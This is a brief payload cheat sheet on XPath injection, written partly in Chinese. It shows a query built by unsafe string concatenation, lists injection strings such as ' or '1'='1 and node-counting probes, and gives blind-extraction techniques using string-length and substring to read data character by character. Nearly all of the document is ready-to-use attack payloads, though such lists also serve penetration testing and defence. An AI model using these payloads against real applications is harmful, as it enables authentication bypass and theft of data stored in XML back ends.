# XPATH 注入

> XPath注入是一种攻击方式利用那些可以解析用户提供的XPath(XML Path语言)查询来查看或者浏览XML文档（运行）。

## Exploitation

和SQL比较类似 : `"string(//user[name/text()='" +vuln_var1+ "' and password/text()=’" +vuln_var1+ "']/account/text())"`

```sql
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
```

## Blind Exploitation

```sql
1. Size of a string
and string-length(account)=SIZE_INT

2. Extract a character
substring(//user[userid=5]/username,2,1)=CHAR_HERE
substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
```

## References

* [OWASP XPATH Injection](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
* [XPATH Blind Explorer](http://code.google.com/p/xpath-blind-explorer/)

